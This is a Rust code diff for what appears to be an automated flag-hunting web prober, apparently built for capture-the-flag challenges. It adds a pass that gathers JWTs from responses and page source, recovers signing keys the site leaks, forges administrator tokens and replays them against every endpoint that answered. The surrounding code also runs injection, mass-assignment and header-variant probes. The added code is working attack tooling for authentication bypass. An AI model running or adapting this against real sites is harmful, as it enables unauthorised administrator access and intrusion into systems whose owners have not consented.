@@ -188,10 +188,17 @@ struct Probe<'a> {
     time_params: Vec<String>,
     fields: Vec<(String, String)>,
     accept_markers: Vec<String>,
+    /// JWTs seen in any response, and the endpoints that answered, so a token can
+    /// be forged and replayed once the crawl has turned both up.
+    tokens: Vec<String>,
+    existing: Vec<String>,
+    /// The page source, for a signing key a site leaks outside its own token.
+    source: Vec<u8>,
 }
 
 impl Probe<'_> {
-    /// Records every new flag a response body carried, tagged with what was sent.
+    /// Records every new flag a response body carried, tagged with what was sent,
+    /// and remembers any JWT in it for the forging pass.
     fn scan(&mut self, url: &str, note: &str, body: &[u8]) {
         for value in flags_in(body) {
             if self.seen.insert(value.clone()) {
@@ -200,6 +207,47 @@ impl Probe<'_> {
                     source: url.to_string(),
                     note: note.to_string(),
                 });
+            }
+        }
+        for token in crate::jwt::find_tokens(body) {
+            if !self.tokens.contains(&token) {
+                self.tokens.push(token);
+            }
+        }
+    }
+
+    /// For every token seen, recovers its key when the site let it slip, forges a
+    /// token that names an administrator, and replays it against the endpoints
+    /// that answered. The key check is exact, so a token is only forged once its
+    /// real key is in hand.
+    async fn forge_and_replay(&mut self) {
+        for token_str in self.tokens.clone() {
+            let Some(token) = crate::jwt::parse(&token_str) else {
+                continue;
+            };
+            let keys = crate::jwt::candidate_keys(&token, &self.source);
+            let Some(key) = crate::jwt::recover_key(&token, &keys) else {
+                continue;
+            };
+            let forged = crate::jwt::forge_admin(&token, &key);
+
+            for url in self.existing.clone() {
+                if *self.budget == 0 || Instant::now() >= self.deadline {
+                    return;
+                }
+                let request = Request {
+                    method: Method::GET,
+                    body: None,
+                    headers: vec![("authorization".into(), format!("Bearer {forged}"))],
+                    timeout: None,
+                };
+                if let Some(response) = self.send(&url, &request).await {
+                    self.scan(
+                        &url,
+                        "a token forged from a recovered signing key was accepted",
+                        &response.body,
+                    );
+                }
             }
         }
     }
@@ -364,7 +412,19 @@ pub async fn run(
         time_params,
         fields,
         accept_markers,
+        tokens: Vec::new(),
+        existing: Vec::new(),
+        source: source_bodies.concat(),
     };
+
+    // Tokens the source already carried, before a single probe is sent.
+    for body in source_bodies {
+        for token in crate::jwt::find_tokens(body) {
+            if !probe.tokens.contains(&token) {
+                probe.tokens.push(token);
+            }
+        }
+    }
 
     for path in candidates {
         if *probe.budget == 0 || Instant::now() >= probe.deadline {
@@ -383,12 +443,17 @@ pub async fn run(
         if !probe.exists(&url).await {
             continue;
         }
+        probe.existing.push(url.clone());
 
         probe.injection(&endpoint).await;
         probe.timestamp(&endpoint).await;
         probe.mass_assignment(&url).await;
         probe.header_variants(&url).await;
     }
+
+    // Last, because it needs both a token and the endpoints that answered, which
+    // only the pass above turns up.
+    probe.forge_and_replay().await;
 
     probe.hits
 }
